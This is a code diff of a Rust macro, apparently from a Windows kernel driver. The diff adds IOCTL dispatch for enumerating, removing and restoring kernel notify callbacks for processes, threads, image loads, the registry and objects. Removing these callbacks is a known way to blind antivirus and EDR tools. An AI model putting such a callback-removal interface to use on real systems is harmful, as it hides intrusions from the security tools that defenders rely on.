@@ -156,28 +156,85 @@ macro_rules! handle_module {
 /// Macro to handle callback-related operations.
 ///
 /// Executes the given action based on the provided parameters and returns the status.
+///
 #[macro_export]
 macro_rules! handle_callback {
-    ($irp:expr, $stack:expr, $action:expr, $input_type:ty, $output_type:ty, $information:expr) => {{
-        let output_buffer = match crate::utils::get_output_buffer::<$output_type>($irp) {
-            Ok(buffer) => buffer,
-            Err(status) => return status,
-        };
+    ($irp:expr, $stack:expr, $input_type:ty, $output_type:ty, $information:expr, $ioctl:expr) => {{
+        use shared::vars::Callbacks;
 
         let input_buffer = match crate::utils::get_input_buffer::<$input_type>($stack) {
             Ok(buffer) => buffer,
             Err(status) => return status,
         };
+
+        let output_buffer = match crate::utils::get_output_buffer::<$output_type>($irp) {
+            Ok(buffer) => buffer,
+            Err(status) => return status,
+        };
+
+        let mut status = 0;
+
+        match $ioctl {
+            IOCTL_ENUMERATE_CALLBACK => {
+                status = match (*input_buffer).callback {
+                    Callbacks::PsSetCreateProcessNotifyRoutine => Callback::enumerate_callback(input_buffer, output_buffer, $information),
+                    Callbacks::PsSetCreateThreadNotifyRoutine => Callback::enumerate_callback(input_buffer, output_buffer, $information),
+                    Callbacks::PsSetLoadImageNotifyRoutine => Callback::enumerate_callback(input_buffer, output_buffer, $information),
+                    Callbacks::CmRegisterCallbackEx => CallbackRegistry::enumerate_callback(input_buffer, output_buffer, $information),
+                    Callbacks::ObProcess => CallbackOb::enumerate_callback(input_buffer, output_buffer, $information),
+                    Callbacks::ObThread => CallbackOb::enumerate_callback(input_buffer, output_buffer, $information),
+                };
+            },
+            IOCTL_ENUMERATE_REMOVED_CALLBACK => {
+                status = match (*input_buffer).callback {
+                    Callbacks::PsSetCreateProcessNotifyRoutine => Callback::enumerate_removed_callback(input_buffer, output_buffer, $information),
+                    Callbacks::PsSetCreateThreadNotifyRoutine => Callback::enumerate_removed_callback(input_buffer, output_buffer, $information),
+                    Callbacks::PsSetLoadImageNotifyRoutine => Callback::enumerate_removed_callback(input_buffer, output_buffer, $information),
+                    Callbacks::CmRegisterCallbackEx => CallbackRegistry::enumerate_removed_callback(input_buffer, output_buffer, $information),
+                    Callbacks::ObProcess => CallbackOb::enumerate_removed_callback(input_buffer, output_buffer, $information),
+                    Callbacks::ObThread => CallbackOb::enumerate_removed_callback(input_buffer, output_buffer, $information),
+                };
+            },
+            _ => {}
+        }
         
-        $action(input_buffer, output_buffer, $information)
+        status
     }};
     
-    ($irp:expr, $action:expr, $type_:ty) => {{
+    ($irp:expr, $type_:ty, $ioctl:expr) => {{
+        use shared::vars::Callbacks;
+
         let input_buffer = match crate::utils::get_input_buffer::<$type_>($irp) {
             Ok(buffer) => buffer, 
             Err(status) => return status,
         };
-        
-        $action(input_buffer)
+
+        let mut status = 0;
+
+        match $ioctl {
+            IOCTL_REMOVE_CALLBACK => {
+                status = match (*input_buffer).callback {
+                    Callbacks::PsSetCreateProcessNotifyRoutine => Callback::remove_callback(input_buffer),
+                    Callbacks::PsSetCreateThreadNotifyRoutine => Callback::remove_callback(input_buffer),
+                    Callbacks::PsSetLoadImageNotifyRoutine => Callback::remove_callback(input_buffer),
+                    Callbacks::CmRegisterCallbackEx => CallbackRegistry::remove_callback(input_buffer),
+                    Callbacks::ObProcess => CallbackOb::remove_callback(input_buffer),
+                    Callbacks::ObThread => CallbackOb::remove_callback(input_buffer),
+                };
+            },
+            IOCTL_RESTORE_CALLBACK => {
+                status = match (*input_buffer).callback {
+                    Callbacks::PsSetCreateProcessNotifyRoutine => Callback::restore_callback(input_buffer),
+                    Callbacks::PsSetCreateThreadNotifyRoutine => Callback::restore_callback(input_buffer),
+                    Callbacks::PsSetLoadImageNotifyRoutine => Callback::restore_callback(input_buffer),
+                    Callbacks::CmRegisterCallbackEx => CallbackRegistry::restore_callback(input_buffer),
+                    Callbacks::ObProcess => CallbackOb::restore_callback(input_buffer),
+                    Callbacks::ObThread => CallbackOb::restore_callback(input_buffer),
+                };
+            },
+            _ => {}
+        }
+
+        status
     }};
 }
